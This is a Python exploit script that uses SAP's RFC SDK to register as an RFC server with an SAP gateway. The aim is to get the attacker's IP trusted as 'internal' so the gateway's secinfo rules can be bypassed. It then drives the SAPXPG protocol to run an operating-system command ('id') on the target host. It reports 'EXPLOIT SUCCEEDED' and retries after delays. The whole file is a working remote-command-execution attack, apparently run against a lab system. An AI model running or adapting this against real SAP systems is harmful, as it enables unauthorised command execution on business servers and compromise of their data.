#!/usr/bin/env python3
"""
test_rfcreg.py — Register as RFC server with the GW via nwrfcsdk, then run SAPXPG.

With gw/reg_no_conn_info = 0 (confirmed in DEFAULT.PFL), when we call
RfcRegisterServer() from IP 192.168.2.210, the GW should add that IP to
GwHostTab as "internal", making the secinfo rule
  P USER=* USER-HOST=internal HOST=local TP=*
match our subsequent SAPXPG connection.

Protocol: RfcRegisterServer(GWHOST=..., GWSERV=sapgw00, PROGRAM_ID=...)
"""
import sys, os, ctypes, time, threading, socket, struct
from ctypes import (
    POINTER, Structure, c_uint, c_uint16, c_int, c_void_p, byref, c_ulong
)

sys.path.insert(0, '/home/joris/Desktop/CLAUDE/SAPMAP')

# nwrfcsdk path
SDK_LIB = '/home/joris/Desktop/nwrfc750P_18-70002752/nwrfcsdk/lib/libsapnwrfc.so'

GW_HOST   = '192.168.2.209'
GW_SERV   = 'sapgw00'
PROG_ID   = 'SAPMAP_REG_001'

# SAPXPG settings
GW_PORT   = 3300
SID       = 'S4H'
INSTANCE  = '00'
HOSTNAME  = 's4hanadev'
KERNEL    = '793_REL'
DEST      = 'T_75'
CLIENT    = '000'
COMMAND   = 'id'
PARAMS    = ''
TIMEOUT   = 15

# ---------------------------------------------------------------------------
# SAP_UC helpers (RFC_CONNECTION_PARAMETER uses SAP_UC = UTF-16LE on Linux)
# ---------------------------------------------------------------------------

def _uc(s):
    """Convert Python str → null-terminated UTF-16LE c_uint16 array."""
    enc = s.encode('utf-16-le')
    n = len(enc) // 2
    arr = (c_uint16 * (n + 1))()
    ctypes.memmove(arr, enc, len(enc))
    arr[n] = 0
    return arr


# ---------------------------------------------------------------------------
# Minimal ctypes structures matching sapnwrfc.h
# ---------------------------------------------------------------------------

# RFC_ERROR_GROUP enum values (subset)
RFC_OK = 0

# RFC_CONNECTION_PARAMETER
class RFC_CONNECTION_PARAMETER(Structure):
    _fields_ = [
        ('name',  c_void_p),   # const SAP_UC*
        ('value', c_void_p),   # const SAP_UC*
    ]


# RFC_ERROR_INFO (simplified; actual structure is 2752 bytes in SDK headers)
# We only need key, message, and group for error reporting.
# Full size is KEY(128 SAP_UC)+msg(512 SAP_UC)+... = keep the buffer large.
class RFC_ERROR_INFO(Structure):
    _pack_ = 1
    _fields_ = [
        ('code',    c_uint),            # RFC_RC (4 bytes)
        ('group',   c_uint),            # RFC_ERROR_GROUP (4 bytes)
        ('key',     c_uint16 * 128),    # SAP_UC[128] — error key
        ('message', c_uint16 * 512),    # SAP_UC[512] — error message
        ('_pad',    ctypes.c_uint8 * (2752 - 4 - 4 - 256 - 1024)),
    ]


def _uc_to_str(arr, n=None):
    """Convert c_uint16 array → Python str (UTF-16LE)."""
    if n is None:
        n = len(arr)
    raw = bytes(bytearray(ctypes.string_at(arr, n * 2)))
    # find null terminator
    result = []
    for i in range(0, len(raw) - 1, 2):
        ch = raw[i] | (raw[i+1] << 8)
        if ch == 0:
            break
        result.append(chr(ch))
    return ''.join(result)


# ---------------------------------------------------------------------------
# Load nwrfcsdk
# ---------------------------------------------------------------------------

def load_sdk():
    # Add SDK lib directory to LD_LIBRARY_PATH equivalent
    sdk_dir = os.path.dirname(SDK_LIB)
    lib = ctypes.CDLL(SDK_LIB)

    VP  = c_void_p
    EI  = POINTER(RFC_ERROR_INFO)
    PCP = POINTER(RFC_CONNECTION_PARAMETER)

    lib.RfcRegisterServer.argtypes  = [PCP, c_uint, EI]
    lib.RfcRegisterServer.restype   = VP

    lib.RfcListenAndDispatch.argtypes = [VP, c_uint, EI]
    lib.RfcListenAndDispatch.restype  = c_uint

    lib.RfcCloseConnection.argtypes = [VP, EI]
    lib.RfcCloseConnection.restype  = c_uint

    lib.RfcGetVersion.argtypes = [POINTER(c_uint), POINTER(c_uint), POINTER(c_uint)]
    lib.RfcGetVersion.restype  = VP

    return lib


# ---------------------------------------------------------------------------
# Build RFC_CONNECTION_PARAMETER array
# ---------------------------------------------------------------------------

def build_params(gwhost, gwserv, program_id):
    # Keep SAP_UC buffers alive as long as the array is used
    names_bufs  = [_uc('GWHOST'), _uc('GWSERV'), _uc('PROGRAM_ID')]
    values_bufs = [_uc(gwhost),   _uc(gwserv),   _uc(program_id)]

    n = len(names_bufs)
    arr = (RFC_CONNECTION_PARAMETER * n)()
    for i in range(n):
        arr[i].name  = ctypes.cast(names_bufs[i],  c_void_p)
        arr[i].value = ctypes.cast(values_bufs[i], c_void_p)

    return arr, names_bufs, values_bufs   # return bufs to keep them alive


# ---------------------------------------------------------------------------
# SAPXPG attempt (imports from standalone module)
# ---------------------------------------------------------------------------

from sap_gw_xpg_standalone import (
    build_p1, build_p2, build_p3, build_p4,
    parse_response, ni_send, ni_recv, ni_drain, hexdump, extract_p4_output,
)


def run_sapxpg():
    print(f'\n[XPG] Attempting SAPXPG (cmd={COMMAND!r})...')
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(TIMEOUT)
    try:
        sock.connect((GW_HOST, GW_PORT))
    except socket.error as e:
        print(f'[XPG] Connect failed: {e}'); return False

    local_ip = sock.getsockname()[0]
    print(f'[XPG] Local IP: {local_ip}')

    # P1
    ni_send(sock, build_p1(GW_HOST, INSTANCE))
    try:
        resp = ni_recv(sock, TIMEOUT)
        frames = [resp] + ni_drain(sock, 1)
    except socket.timeout:
        print('[XPG] P1 timeout'); sock.close(); return False
    for f in frames:
        if parse_response(f)['error']:
            print('[XPG] P1 rejected'); sock.close(); return False
    print(f'[XPG] P1 OK ({len(frames)} frames)')

    # P2
    p2 = build_p2(GW_HOST, DEST, local_ip=local_ip, target_hostname=HOSTNAME)
    ni_send(sock, p2)
    conv_id = None
    gw_id   = 0
    try:
        resp   = ni_recv(sock, TIMEOUT)
        frames = [resp] + ni_drain(sock, 1)
        print(f'[XPG] P2 raw first frame:\n{hexdump(frames[0][:80])}')
        for f in frames:
            info = parse_response(f)
            if info['error']:
                msg = info.get('error_msg', '')
                print(f'[XPG] P2 REJECTED: {msg}')
                if 'appc_rc=26' in msg:
                    print('[XPG]  → IP not in GwHostTab')
                sock.close(); return False
            if info['conv_id'] and not conv_id:
                conv_id = info['conv_id']
            if info.get('gw_id') is not None:
                gw_id = info['gw_id']
    except socket.timeout:
        print('[XPG] P2 timeout'); sock.close(); return False

    print(f'[XPG] P2 OK: conv_id={conv_id!r} gw_id={gw_id}')
    if not conv_id:
        conv_id = '0'

    # small delay to let GW finalize conversation
    time.sleep(0.5)

    # P3
    p3 = build_p3(conv_id, GW_HOST, HOSTNAME, SID, INSTANCE,
                  KERNEL, DEST, CLIENT, COMMAND, PARAMS, gw_id=gw_id)
    ni_send(sock, p3)
    try:
        resp   = ni_recv(sock, TIMEOUT)
        frames = [resp] + ni_drain(sock, 1)
    except socket.timeout:
        print('[XPG] P3 timeout'); sock.close(); return False

    p3_output = []
    for f in frames:
        info = parse_response(f)
        if info['error']:
            print(f'[XPG] P3 error: {info.get("error_msg", "")}')
            sock.close(); return False
        p3_output.extend(extract_p4_output(f))

    if p3_output:
        print('[XPG] *** COMMAND OUTPUT (P3) ***')
        for ln in p3_output: print(f'    {ln}')
        sock.close(); return True

    # P4
    p4 = build_p4(conv_id, GW_HOST, HOSTNAME, SID, INSTANCE,
                  KERNEL, DEST, CLIENT, gw_id=gw_id)
    ni_send(sock, p4)
    try:
        resp = ni_recv(sock, TIMEOUT)
        info = parse_response(resp)
        if info['error']:
            print(f'[XPG] P4 error: {info.get("error_msg", "")}')
        else:
            output = extract_p4_output(resp)
            if output:
                print('[XPG] *** COMMAND OUTPUT (P4) ***')
                for ln in output: print(f'    {ln}')
                sock.close(); return True
            print('[XPG] P4 OK but no output')
    except socket.timeout:
        print('[XPG] P4 timeout')

    sock.close()
    return False


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    print('=== RFC Server Registration → GwHostTab → SAPXPG ===')
    print(f'GW: {GW_HOST}  GWSERV: {GW_SERV}  PROG_ID: {PROG_ID}')
    print()

    lib = load_sdk()

    # Print SDK version
    maj = c_uint(); min_ = c_uint(); patch = c_uint()
    lib.RfcGetVersion(byref(maj), byref(min_), byref(patch))
    print(f'[*] nwrfcsdk version: {maj.value}.{min_.value}.{patch.value}')

    # Baseline SAPXPG before registration (should fail with appc_rc=26)
    print('\n--- Baseline SAPXPG (before registration) ---')
    run_sapxpg()

    # Register as RFC server
    print(f'\n[*] Calling RfcRegisterServer(GWHOST={GW_HOST}, GWSERV={GW_SERV}, PROGRAM_ID={PROG_ID})...')
    err = RFC_ERROR_INFO()
    params_arr, _names, _values = build_params(GW_HOST, GW_SERV, PROG_ID)
    handle = lib.RfcRegisterServer(params_arr, 3, byref(err))

    if not handle:
        key = _uc_to_str(err.key)
        msg = _uc_to_str(err.message)
        print(f'[!] RfcRegisterServer FAILED: key={key!r}  msg={msg!r}')
        print(f'    code={err.code}  group={err.group}')
        return

    print(f'[+] RfcRegisterServer SUCCESS: handle={handle:#x}')
    print('[*] Our IP (192.168.2.210) should now be in GwHostTab as INTERNAL')
    print('[*] Waiting 2s for GW to update its trust table...')
    time.sleep(2)

    # Now try SAPXPG — should succeed because our IP is now "internal"
    print('\n--- SAPXPG after RFC server registration ---')
    success = run_sapxpg()

    if success:
        print('\n[+] EXPLOIT SUCCEEDED via RFC server registration path!')
    else:
        print('\n[-] SAPXPG still failing — checking registration details...')

    # Try a few more times with longer delay (give GW more time to update)
    if not success:
        for wait_s, label in [(5, '5s'), (10, '10s')]:
            print(f'\n--- SAPXPG retry at t+{label} ---')
            time.sleep(wait_s - 2)
            success = run_sapxpg()
            if success:
                print(f'\n[+] EXPLOIT SUCCEEDED at t+{label}!')
                break

    # Clean up
    err2 = RFC_ERROR_INFO()
    lib.RfcCloseConnection(handle, byref(err2))
    print('\n[*] RFC server registration closed.')
    print(f'[*] Final result: {"SUCCESS" if success else "FAILED"}')


if __name__ == '__main__':
    main()
